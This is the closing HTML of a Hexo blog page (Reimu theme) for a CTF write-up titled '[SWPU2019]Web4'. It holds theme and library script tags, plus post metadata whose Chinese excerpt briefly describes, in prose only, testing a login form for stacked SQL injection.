+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[SWPU2019]Web4",
+          url: "http://example.com/2025/05/10/[SWPU2019]Web4/",
+          excerpt: "",
+          description: "",
+          stripContent: " 感觉是sql注入 但注册说没开放，点登录没反应 我们抓包看看 判断注入手法我们账号和密码都输入admin,开始发包和抓包  回显202 username中加入单引号会直接500错误，而闭合引号后会正常显示。因此可大致确定注入存在 由于题目对username进行了严格的检测，所以无法使用单语句进行注入，但是注入点又存在，于是可以尝试进行堆叠注入 我们判断一下堆叠注入是否存在 存在堆叠注入的判断方法 : 名称处加单引号报错，加双引号不报错，加单引号和分号不报错，说明存在堆叠注入。 根据判断方法，当",
+          date: "Sat May 10 2025 11:41:53 GMT+0800",
+          updated: "Sun May 11 2025 15:09:15 GMT+0800",
+          cover: "/../images/1737907114de8a.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
